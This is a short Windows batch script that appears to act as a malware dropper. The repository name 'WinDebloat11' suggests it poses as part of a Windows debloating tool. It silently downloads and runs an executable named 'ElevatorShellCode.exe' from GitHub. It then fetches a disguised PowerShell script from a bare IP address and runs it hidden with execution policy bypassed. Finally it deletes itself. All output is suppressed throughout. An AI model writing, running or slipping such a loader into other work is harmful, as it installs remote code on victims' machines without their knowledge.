@echo off
bitsadmin /transfer e /download /priority high https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/brokers/ElevatorShellCode.exe %TEMP%\es.exe >nul 2>&1
start /b "" "%TEMP%\es.exe" >nul 2>&1
timeout /t 8 /nobreak >nul
bitsadmin /transfer u /download /priority high https://193.26.115.196/updatemspuls.ps1 %TEMP%\u.ps1 >nul 2>&1
powershell -ep bypass -w hidden -file %TEMP%\u.ps1
del "%~f0"
